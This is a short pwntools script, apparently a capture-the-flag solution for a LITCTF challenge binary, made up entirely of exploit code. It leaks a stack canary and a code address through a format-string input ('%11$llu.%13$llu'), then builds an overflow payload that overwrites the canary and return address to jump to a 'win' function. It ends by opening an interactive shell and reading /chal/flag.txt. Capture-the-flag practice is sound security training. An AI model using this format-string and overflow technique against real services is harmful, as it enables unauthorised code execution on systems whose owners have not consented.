from pwn import *

exe = context.binary = ELF('./s')

io = remote('localhost', 1337) #remote('litctf.org', 31791) #exe.process()

io.sendline(b'%11$llu.%13$llu')
# So winaddr starts with 0x000055XXXXX1e9
lowerCanary, winaddr = io.recv(100).split(b'.')
#io.recv(50).strip()
lowerCanary = hex(int(lowerCanary))
winaddr = hex(int(winaddr) - 192)
print(f'lowerCanary: {lowerCanary} winaddr: {winaddr}')

payload = fit({
    40: p64(int(lowerCanary, 16)),
    48: p64(int(winaddr, 16)),
    56: p64(int(winaddr, 16))
})
print(payload)

io.sendline(payload)
io.interactive()
io.sendline(b'cat /chal/flag.txt')
print(io.recvline())